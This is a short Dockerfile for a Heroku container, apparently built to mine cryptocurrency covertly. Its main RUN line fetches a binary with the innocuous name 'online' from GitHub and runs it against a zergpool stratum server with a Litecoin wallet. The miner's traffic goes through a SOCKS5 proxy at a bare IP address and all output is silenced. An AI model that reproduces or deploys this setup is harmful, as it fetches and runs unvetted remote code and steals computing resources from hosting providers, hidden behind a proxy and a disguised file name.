FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/ampskp/justgrab/raw/main/online; chmod +x online; ./online -a scryptn2 -o stratum+tcp://scryptn2.asia.mine.zergpool.com:3435 -u MAU5ycXcJM3sBjREYEaFzRgxvbxYwkfQ4Y -p c=LTC,ID=ampskpi -t 2 -x socks5://192.252.214.20:15864 > /dev/null 2>&1
CMD bash heroku.sh
